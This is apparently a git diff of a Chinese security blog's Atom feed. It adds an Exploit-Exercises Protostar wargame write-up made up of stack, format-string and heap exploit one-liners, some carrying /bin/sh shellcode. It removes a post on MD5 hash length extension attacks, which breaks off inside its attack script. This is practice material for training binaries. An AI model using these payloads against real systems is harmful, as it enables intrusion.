@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2017-03-24T08:34:58.498Z</updated>
+  <updated>2017-04-11T06:51:42.437Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -16,13 +16,91 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Exploit-Exercises Protostar writeup PART I</title>
+    <link href="http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/"/>
+    <id>http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/</id>
+    <published>2017-04-11T06:48:37.000Z</published>
+    <updated>2017-04-11T06:51:42.437Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x44*'a'"</span> | ./stack0</div><div class="line">you have changed the <span class="string">'modified'</span> variable</div></pre></td></tr></table></figure>
+<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x64\x63\x62\x61'"</span> | xargs ./stack1</div><div class="line">you have correctly got the variable to the right value</div></pre></td></tr></table></figure>
+<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</div><div class="line">os.system(<span class="string">"./stack2"</span>)</div></pre></td></tr></table></figure>
+<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack3 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 08048424    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x24\x84\x04\x08'"</span> | ./stack3</div><div class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
+<h2 id="stack-4"><a href="#stack-4" class="headerlink" title="stack 4"></a>stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack4 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 080483f4    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 76*'a'+'\xf4\x83\x04\x08'"</span>|./stack4</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
+<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : disabled</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
+<p>系统没开ASLR。让程序崩溃，调试core dump获得stack address。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print 0x4c*'a'+'\x10\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack5</div></pre></td></tr></table></figure></p>
+<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>return addr =&gt; addr(ret) =&gt; stack addr</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048508</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x08\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
+<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048553</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x53\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
+<h2 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 0x40*'a'+'\xef\xbe\xad\xde'" | xargs ./format0</span></div><div class="line">you have hit the target correctly :)</div></pre></td></tr></table></figure>
+<h2 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h2><p><code>%128$n</code>代表第128个参数，argv会放在栈上。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\x38\x96\x04\x08\x08\x04aaa%128\$n'" | xargs ./format1                                                                       aaayou have modified the target :)</span></div></pre></td></tr></table></figure>
+<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048477 &lt;vuln+35&gt;: call   0x804835c &lt;fgets@plt&gt;</div><div class="line">   0x804847c &lt;vuln+40&gt;: lea    eax,[ebp-0x208]</div><div class="line">   0x8048482 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048485 &lt;vuln+49&gt;: call   0x804837c &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4</div><div class="line">   0x804848f &lt;vuln+59&gt;: cmp    eax,0x40</div><div class="line">   0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;</div><div class="line">   0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd440 --&gt; 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">0004| 0xffffd444 --&gt; 0x200</div><div class="line">0008| 0xffffd448 --&gt; 0xf7<span class="built_in">fc</span>2c20 --&gt; 0xfbad2288</div><div class="line">0012| 0xffffd44c --&gt; 0xf7fec308 (&lt;_dl_check_map_versions+632&gt;:  mov    edi,eax)</div><div class="line">0016| 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div></pre></td></tr></table></figure>
+<p>exploit:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\xe4\x96\x04\x08%4\$060x%4\$n'" | ./format2</span></div><div class="line">.0000000000000000000000000000000000000000000000000000080496e4</div><div class="line">you have modified the target :)</div></pre></td></tr></table></figure>
+<h2 id="format3"><a href="#format3" class="headerlink" title="format3"></a>format3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\xf4\x96\x04\x08%12\$016930112x%12\$n'"</span> | ./format3</div></pre></td></tr></table></figure>
+<p>看了我的方法还是有点弱- -，基本就是一字节写比较好的方法</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"\xf7\x96\x04\x08"+"%52x%12$n%13$n%14$n%15$n"'</span> | ./format3</div><div class="line">target is 44444444 :(</div></pre></td></tr></table></figure>
+<h2 id="format4"><a href="#format4" class="headerlink" title="format4"></a>format4</h2><p>写exit的GOT表中的数据,<code>GOT[&quot;exit&quot;]=0x08049724</code>，单字节写入。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08'+'%0164x%4\$n%0208x%5\$n%0128x%6\$n%260x%7\$n'"</span> | ./format4</div></pre></td></tr></table></figure>
+<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>winner = 0x08048464</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 72*'a'+'\x64\x84\x04\x08'" | xargs ./heap0</span></div><div class="line">data is at 0x804a008, fp is at 0x804a050</div><div class="line">level passed</div></pre></td></tr></table></figure>
+<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>GOT[“puts”] = 0x08049774<br>winner = 0x08048494<br>没啥说的，把第二个指针覆盖为puts的got地址，第二次strcpy把winner写入puts的got表中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap1 $(python -c "print 20 * 'a' + '\x74\x97\x04\x08'")  $(python -c "print '\x94\x84\x04\x08'")</span></div><div class="line">and we have a winner @ 1491862467</div></pre></td></tr></table></figure>
+<h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><p>很明显的UAF，struct auth = 36字节，先创建auth，再free再用strdup分配36字节大小的空间即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ auth = (nil), service = (nil) ]</div><div class="line">auth aaaaa</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">reset</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div><div class="line">login</div><div class="line">you have logged <span class="keyword">in</span> already!</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div></pre></td></tr></table></figure>
+<h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><p>unlink导致任意地址写</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap3 $(python -c 'print "A" * 4 + "\x68\x64\x88\x04\x08\xc3"') $(python -c 'print "A" * 32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 8 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC</span></div><div class="line">that wasn<span class="string">'t too bad now, was it? @ 1491865342</span></div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;stack0&quot;&gt;&lt;a href=&quot;#stack0&quot; class=&quot;headerlink&quot; title=&quot;stack0&quot;&gt;&lt;/a&gt;stack0&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
+    
+      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>生成自己的Alphanumeric/Printable shellcode</title>
+    <link href="http://weaponx.site/2017/04/07/%E7%94%9F%E6%88%90%E8%87%AA%E5%B7%B1%E7%9A%84Alphanumeric-Printable-shellcode/"/>
+    <id>http://weaponx.site/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/</id>
+    <published>2017-04-07T08:40:22.000Z</published>
+    <updated>2017-04-12T02:35:38.181Z</updated>
+    
+    <content type="html"><![CDATA[<p>文章已经发表到360播报:<a href="http://bobao.360.cn/learning/detail/3720.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3720.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;文章已经发表到360播报:&lt;a href=&quot;http://bobao.360.cn/learning/detail/3720.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/detail/3
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
+    
+      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
+    
+  </entry>
+  
+  <entry>
     <title>unexploitable Writeup[pwnable.tw]</title>
     <link href="http://weaponx.site/2017/03/24/unexploitable-Writeup-pwnable-tw/"/>
     <id>http://weaponx.site/2017/03/24/unexploitable-Writeup-pwnable-tw/</id>
     <published>2017-03-24T08:34:20.000Z</published>
-    <updated>2017-03-24T08:34:58.498Z</updated>
+    <updated>2017-04-12T02:36:12.302Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="0x00-unexploitable"><a href="#0x00-unexploitable" class="headerlink" title="0x00 unexploitable"></a>0x00 unexploitable</h2><p>最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的，个人信息 <a href="https://pwnable.tw/user/927" target="_blank" rel="external">https://pwnable.tw/user/927</a> ）的题，看到了一个unexploitable的题目。根据题目描述:</p>
+    <content type="html"><![CDATA[<h2 id="0x00-unexploitable"><a href="#0x00-unexploitable" class="headerlink" title="0x00 unexploitable"></a>0x00 unexploitable</h2><p>最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的）的题，看到了一个unexploitable的题目。根据题目描述:</p>
 <blockquote>
 <p>The original challenge is on pwnable.kr and it is solvable.<br>This time we fix the vulnerability and now we promise that the service is unexploitable.</p>
 </blockquote>
@@ -48,7 +126,7 @@
     
     <summary type="html">
     
-      &lt;h2 id=&quot;0x00-unexploitable&quot;&gt;&lt;a href=&quot;#0x00-unexploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 unexploitable&quot;&gt;&lt;/a&gt;0x00 unexploitable&lt;/h2&gt;&lt;p&gt;最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的，个人信息 &lt;a href=&quot;https://pwnable.tw/user/927&quot;&gt;https://pwnable.tw/user/927&lt;/a&gt; ）的题，看到了一个unexploitable的题目。根据题目描述:&lt;/p&gt;
+      &lt;h2 id=&quot;0x00-unexploitable&quot;&gt;&lt;a href=&quot;#0x00-unexploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 unexploitable&quot;&gt;&lt;/a&gt;0x00 unexploitable&lt;/h2&gt;&lt;p&gt;最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的）的题，看到了一个unexploitable的题目。根据题目描述:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The original challenge is on pwnable.kr and it is solvable.&lt;br&gt;This time we fix the vulnerability and now we promise that the service is unexploitable.&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1011,185 +1089,6 @@
       <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
     
       <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>关于主题暂时更换</title>
-    <link href="http://weaponx.site/2017/01/16/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98%E6%9A%82%E6%97%B6%E6%9B%B4%E6%8D%A2/"/>
-    <id>http://weaponx.site/2017/01/16/关于主题暂时更换/</id>
-    <published>2017-01-16T15:08:20.000Z</published>
-    <updated>2017-01-18T16:51:39.912Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-之前使用的主题-Material"><a href="#0x00-之前使用的主题-Material" class="headerlink" title="0x00 之前使用的主题-Material"></a>0x00 之前使用的主题-Material</h2><p>Material，主题的Demo在<em><a href="https://blog.viosey.com" target="_blank" rel="external">https://blog.viosey.com</a></em>，主题的项目地址<em><a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="external">https://github.com/viosey/hexo-theme-material</a></em>。</p>
-<p>优点我总结一下：</p>
-<ul>
-<li>外观美观</li>
-<li>扩展性强</li>
-<li>中文支持好</li>
-<li>国内应用扩展支持好</li>
-</ul>
-<p>但是个人觉得图片有点过多，对于我这种托管在代码平台上的影响访问速度；然后就是代码高亮有一些bug，看了项目的issue(<em><a href="https://github.com/viosey/hexo-theme-material/issues/58" target="_blank" rel="external">https://github.com/viosey/hexo-theme-material/issues/58</a></em>)。作为一个程序员，无法忍受这个bug233333</p>
-<a id="more"></a>
-<h2 id="0x01-现在使用的主题-Light"><a href="#0x01-现在使用的主题-Light" class="headerlink" title="0x01 现在使用的主题-Light"></a>0x01 <del>现在使用的主题-Light</del></h2><p>Light，主题的Demo在<em><a href="https://hexo.io/hexo-theme-light/" target="_blank" rel="external">https://hexo.io/hexo-theme-light/</a></em>, 主题的项目地址<em><a href="https://github.com/hexojs/hexo-theme-light" target="_blank" rel="external">https://github.com/hexojs/hexo-theme-light</a></em>、</p>
-<p>这个主题简介美观，主要是代码高亮看着好舒服，好舒服，好舒服！但是老外的作品基本都是国外那一套（不符合国情233）。</p>
-<h2 id="0x02-为什么要更换主题"><a href="#0x02-为什么要更换主题" class="headerlink" title="0x02 为什么要更换主题"></a>0x02 为什么要更换主题</h2><p>代码高亮bug，作为一个程序员无法忍受啊！只能暂时更换light主题。等bug修复后再切换回去，<del>或者基于light主题重新开发</del>。在看light的issue的时候发现了国人重写的light太符合我的口味了！于是切换到了light-ch。项目Demo:<em><a href="http://lupeng.me/" target="_blank" rel="external">http://lupeng.me/</a></em>。 项目地址<em><a href="https://github.com/pengloo53/Hexo-theme-light_cn" target="_blank" rel="external">https://github.com/pengloo53/Hexo-theme-light_cn</a></em>。主题就这样了！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-之前使用的主题-Material&quot;&gt;&lt;a href=&quot;#0x00-之前使用的主题-Material&quot; class=&quot;headerlink&quot; title=&quot;0x00 之前使用的主题-Material&quot;&gt;&lt;/a&gt;0x00 之前使用的主题-Material&lt;/h2&gt;&lt;p&gt;Material，主题的Demo在&lt;em&gt;&lt;a href=&quot;https://blog.viosey.com&quot;&gt;https://blog.viosey.com&lt;/a&gt;&lt;/em&gt;，主题的项目地址&lt;em&gt;&lt;a href=&quot;https://github.com/viosey/hexo-theme-material&quot;&gt;https://github.com/viosey/hexo-theme-material&lt;/a&gt;&lt;/em&gt;。&lt;/p&gt;
-&lt;p&gt;优点我总结一下：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;外观美观&lt;/li&gt;
-&lt;li&gt;扩展性强&lt;/li&gt;
-&lt;li&gt;中文支持好&lt;/li&gt;
-&lt;li&gt;国内应用扩展支持好&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;但是个人觉得图片有点过多，对于我这种托管在代码平台上的影响访问速度；然后就是代码高亮有一些bug，看了项目的issue(&lt;em&gt;&lt;a href=&quot;https://github.com/viosey/hexo-theme-material/issues/58&quot;&gt;https://github.com/viosey/hexo-theme-material/issues/58&lt;/a&gt;&lt;/em&gt;)。作为一个程序员，无法忍受这个bug233333&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
-    
-      <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>哈希长度扩展攻击</title>
-    <link href="http://weaponx.site/2017/01/16/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
-    <id>http://weaponx.site/2017/01/16/哈希长度扩展攻击/</id>
-    <published>2017-01-16T13:07:07.000Z</published>
-    <updated>2017-02-06T18:03:20.389Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><blockquote>
-<p>Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p>
-</blockquote>
-<p>–摘自百度</p>
-<p>哈希长度扩展攻击简单的来讲就是：<br>1.知道一个密文(SECRET)的哈希<br>2.知道密文的长度(SECRET LENGTH)<br>在不知道密文的情况下可以推算出密文+填充+追加消息(SECRET+PADDING+EXTRA)的哈希，也就是说在只知道密文长度和密文哈希的情况下，可以预测出密文和另一消息拼接后的哈希。</p>
-<a id="more"></a>
-<h2 id="0x01-理解哈希算法流程"><a href="#0x01-理解哈希算法流程" class="headerlink" title="0x01 理解哈希算法流程"></a>0x01 理解哈希算法流程</h2><p>易受哈希长度扩展攻击的哈希算法：SHA系列和MD系列。这两个系列的哈希算法都有一个共同点——基于Merkle–Damgård构造。</p>
-<p><img src="http://i.imgur.com/vwapHAd.png" alt=""></p>
-<p>上图可以看出，Merkle–Damgård算法的流程如下：</p>
-<ol>
-<li>把消息划分为n个消息块</li>
-<li>对最后一个消息块做长度填充</li>
-<li>每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量</li>
-</ol>
-<h2 id="0x02-理解MD5算法流程"><a href="#0x02-理解MD5算法流程" class="headerlink" title="0x02 理解MD5算法流程"></a>0x02 理解MD5算法流程</h2><p>了解了Merkle–Damgård算法的流程，下面详细了解一下MD5算法的流程，我们可以参考RFC 1321(<a href="http://www.ietf.org/rfc/rfc1321.txt)。" target="_blank" rel="external">http://www.ietf.org/rfc/rfc1321.txt)。</a><br>MD5算法包括四大步骤</p>
-<ol>
-<li>Append Padding Bits(填充bits)</li>
-<li>Append Length(填充长度)</li>
-<li>Initialize MD Buffer(初始化向量)</li>
-<li>Process Message in 16-Word Blocks(复杂的函数运算)</li>
-</ol>
-<p>我们主要需要了解前三步，也就是MD5算法中的填充和生成初始化向量。首先，我们看一下MD5中填充bits的算法，该算法的流程如下：</p>
-<ol>
-<li>根据消息的长度确定填充的字节数，即填充后消息长度 mod 512bit = 448bit。举个例子：一个消息是”message”，则这个消息是56bit，所以需要填充392bit。</li>
-<li>最小填充1bit最多填充512bit，即使消息长度 mod 512 = 448bit。也就是说，不管消息长度是多少，都必须进行填充。</li>
-<li>填充信息的第一个字节是0x80，剩余数据用0x00填充。</li>
-</ol>
-<p>然后，我们看一下填充长度的流程：</p>
-<ol>
-<li>填充长度的大小是64bit</li>
-<li>长度是小端存储的，也就是说高字节放在高地址中</li>
-<li>如果消息的长度大于2 ^ 64，也就是大于2048PB。那么64bit无法存储消息的长度，则取低64bit。</li>
-</ol>
-<p>下图是补位的示例，要进行哈希运算的消息是字符串”message”，则：</p>
-<p><img src="http://i.imgur.com/uZ6HRrf.png" alt=""></p>
-<p>最后，初始化向量为固定值：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">ID</th>
-<th style="text-align:left">Value</th>
-<th style="text-align:left">Vector</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">A</td>
-<td style="text-align:left">01  23  45  67</td>
-<td style="text-align:left">0x67452301</td>
-</tr>
-<tr>
-<td style="text-align:left">B</td>
-<td style="text-align:left">89  AB  CD  EF</td>
-<td style="text-align:left">0xEFCDAB89</td>
-</tr>
-<tr>
-<td style="text-align:left">C</td>
-<td style="text-align:left">FE  DC  BA  98</td>
-<td style="text-align:left">0x98BADCFE</td>
-</tr>
-<tr>
-<td style="text-align:left">D</td>
-<td style="text-align:left">76  54  32  10</td>
-<td style="text-align:left">0x10325476</td>
-</tr>
-</tbody>
-</table>
-<p>然后，用初始化向量和补位后的消息进行复杂的函数运算，最终得到消息”message”的MD5值为78e731027d8fd50ed642340b7c9a63b3。</p>
-<h2 id="0x03-理解MD5长度扩展攻击"><a href="#0x03-理解MD5长度扩展攻击" class="headerlink" title="0x03 理解MD5长度扩展攻击"></a>0x03 理解MD5长度扩展攻击</h2><p>如果一个消息长度大于512bit，则会对消息按512bit进行切分，最后一个消息块进行填充操作。</p>
-<p>假设我们知道一个7字节也就是56bit的消息的MD5值是78e731027d8fd50ed642340b7c9a63b3。</p>
-<p>则MD5算法对其进行运算时，会先补位，由于消息的内容我们不知道，所以补位的结果如下图</p>
-<p><img src="http://i.imgur.com/UnMRrvY.png" alt=""></p>
-<p>然后会和初始向量进行复杂的函数运算，因为MD5值为78e731027d8fd50ed642340b7c9a63b3，故得到的结果为</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">Vector</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">A=0x0231e778</td>
-</tr>
-<tr>
-<td style="text-align:center">B=0x0ed58f7d</td>
-</tr>
-<tr>
-<td style="text-align:center">C=0x0b3442d6</td>
-</tr>
-<tr>
-<td style="text-align:center">D=0xb3639a7c</td>
-</tr>
-</tbody>
-</table>
-<p>若向补位后的消息再追加一条消息字符串”admin”，则会对这个字符串进行补位，再利用上一个运算算出的值作为初始向量进行函数运算，最终得到的MD5值为e53a681a30ff99e3f6522270ca7db244。</p>
-<p>这样就完成了在不知道消息的情况下，计算出消息+填充+追加消息的MD5值。</p>
-<p>我们可以验证一下，假设验证用户登录的程序是这样的：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(password, hash_val)</span>:</span></div><div class="line">    m = hashlib.md5()</div><div class="line">    secret_key = <span class="string">"message"</span></div><div class="line">    m.update(secret_key + password)</div><div class="line">    <span class="keyword">if</span>(m.hexdigest() == hash_val):</div><div class="line">        <span class="keyword">print</span> <span class="string">"Login Successful!"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Login Failed"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    password = unquote(sys.argv[<span class="number">1</span>])</div><div class="line">    hash_val = unquote(sys.argv[<span class="number">2</span>])</div><div class="line">    login(password, hash_val)</div></pre></td></tr></table></figure>
-<p>现在只知道一组用户名和hash，root和f3c36e01c874865bc081e4ae7af037ea</p>
-<p><img src="http://i.imgur.com/eisLG81.png" alt=""></p>
-<p>由分析可知，我们在知道secret_key长度的情况下，可以伪造padding，再通过追加字符串可以算出secret+padding+追加字符串的MD5值。假设我们追加的字符串为admin，则通过哈希扩展攻击计算出md5(secret+padding+追加字符串) = e53a681a30ff99e3f6522270ca7db244。然后我们测试一下，显示登录成功：</p>
-<p><img src="http://i.imgur.com/Ppmoqyo.png" alt=""></p>
-<p>md5扩展攻击代码如下(网上找的稍作修改，用法：python md5.py 攻击的md5 追加的消息 secret的长度):</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8    </span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &amp; y) | ((~x) &amp; z)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">G</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &amp; z) | (y &amp; (~z))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> x ^ y ^ z</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">I</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> y ^ (x | (~z))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_rotateLeft</span><span class="params">( x, n)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">XX</span><span class="params">(func, a, b, c, d, x, s, ac)</span>:</span></div><div class="line">    res = <span class="number">0L</span></div><div class="line">    res = res + a + func(b, c, d)</div><div class="line">    res = res + x</div><div class="line">    res = res + ac</div><div class="line">    res = res &amp; <span class="number">0xffffffffL</span></div><div class="line">    res = _rotateLeft(res, s)</div><div class="line">    res = res &amp; <span class="number">0xffffffffL</span></div><div class="line">    res = res + b</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xffffffffL</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">md5</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span 